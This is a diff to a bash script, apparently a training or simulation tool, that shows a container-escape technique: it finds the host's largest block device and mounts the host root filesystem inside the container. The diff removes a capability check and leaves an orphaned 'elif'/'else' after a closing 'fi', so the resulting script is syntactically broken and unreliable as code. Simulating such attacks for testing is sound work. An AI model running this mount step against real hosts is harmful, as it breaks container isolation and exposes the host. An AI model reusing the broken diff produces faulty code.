@@ -10,16 +10,21 @@ RESET="\e[0m"
 echo -e "\n${YELLOW}>>> [Privilege Escalation] Escape to Host Technique ${RESET}"
 echo "Let's simulate the case when an attacker mounts root host filesystem inside the container"
 
-capability=$(capsh --print | grep "Bounding set" | grep -q "CAP_SYS_ADMIN");
+# Initialize error variable
+error=""
+
+echo "Discovering root host block devices ..."
+
 device=$(lsblk -o NAME,SIZE -d | sort -k2 -h | tail -n 1 | awk '{print $1}')
-error=$(mount /dev/$device /mnt/ 2>&1)
 
-echo "Checking Linux capabilities and trying to mount root host device ..."
+echo "Trying to mount root host device /dev/${device} ..."
 
-if [[ -z "$capability" ]]; then
-    echo -e "${RED}Error! CAP_SYS_ADMIN capability was not found ${RESET}"
+if ! mount /dev/$device /mnt/ >/dev/null 2>&1; then
+    error="Failed to mount /dev/$device"
+fi
+
 elif [[ -n "$error" ]]; then
-    echo -e "${RED}Error! Mount of the device ${device} was failed: $error ${RESET}"
+    echo -e "${RED}Error! Mount attempt was done but failed: $error ${RESET}"
     else
-    echo -e "${Green}Success! The root host device ${device} was mounted ${RESET}"
+    echo -e "${Green}Success! Mount attempt was successful ${RESET}"
 fi
